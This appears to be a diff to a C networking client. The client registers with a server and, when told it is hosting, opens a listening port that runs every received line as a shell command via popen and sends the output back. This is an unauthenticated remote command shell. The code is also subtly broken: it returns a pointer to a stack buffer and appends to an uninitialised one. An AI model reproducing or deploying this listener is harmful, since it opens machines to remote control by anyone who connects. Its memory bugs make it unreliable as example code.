@@ -11,6 +11,30 @@
 char server_ip[20] = "127.0.0.1";
 char server_port[10] = "5001";
 
+char* execute(char command[])
+{
+	FILE *fpipe;
+	char buffer[256];
+	char line[10];
+
+	if (0 == (fpipe = (FILE*)popen(command, "r")))
+    {
+      perror("popen() failed.");
+      exit(1);
+    }
+
+	 while (fread(line, sizeof line, 1, fpipe))
+    {
+        printf("%s", line);
+				strcat(buffer, line);
+    }
+
+	pclose(fpipe);
+	
+	printf("return %s\n", buffer);
+	return buffer;
+}
+
 int main( int argc, char *argv[] )
 {
 	int sockfd, portno, n;
@@ -27,8 +51,6 @@ int main( int argc, char *argv[] )
   serv_addr.sin_family = AF_INET;
   bcopy((char *)server->h_addr, (char*)&serv_addr.sin_addr.s_addr, server->h_length);
   serv_addr.sin_port = htons(portno);
-	int* optval;
-	setsockopt(sockfd, 1, SO_REUSEADDR, &optval,4);
 
 	if (connect(sockfd, (struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0) 
   {
@@ -50,8 +72,10 @@ int main( int argc, char *argv[] )
 			if(strcmp(buffer,"Now you are hosting") == 0)
 			{
 				bzero(buffer,256);
+				strcpy(buffer, "port");
+				write(sockfd, buffer, 255);
 				read(sockfd,buffer,255);
-				int my_port = atoi(buffer);
+				int my_port = atoi(buffer); printf("portyyy %d\n", my_port);
 				close(sockfd);
 				struct sockaddr_in cli_addr, my_addr;
 				my_addr.sin_family = AF_INET;
@@ -59,6 +83,8 @@ int main( int argc, char *argv[] )
   			my_addr.sin_port = htons(my_port);
 				sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
+				int* optval;
+				setsockopt(sockfd, 1, SO_REUSEADDR, &optval,4);
 				if (bind(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr)) < 0)
 				{
 					perror("ERROR on binding");
@@ -69,12 +95,23 @@ int main( int argc, char *argv[] )
 				bzero(buffer,256);
 				listen(sockfd,3);
 				clilen = sizeof(cli_addr);
+				char buffer2[256];
 
 				while(1)
 				{
 					newsockfd = accept(sockfd, (struct sockaddr *)&cli_addr, (socklen_t*) &clilen);
-					read(newsockfd,buffer,255);
-					printf("%s\n",buffer);
+					
+					while(1)
+					{
+						read(newsockfd,buffer,255);
+						int len = strlen(buffer);
+						buffer[len - 1] = '\0';
+						printf("%s\n",buffer);
+						bzero(buffer2, 256);
+						strcpy(buffer2, execute(buffer));
+						write(newsockfd,buffer2,255);
+						
+					}
 				}					
 			}
 
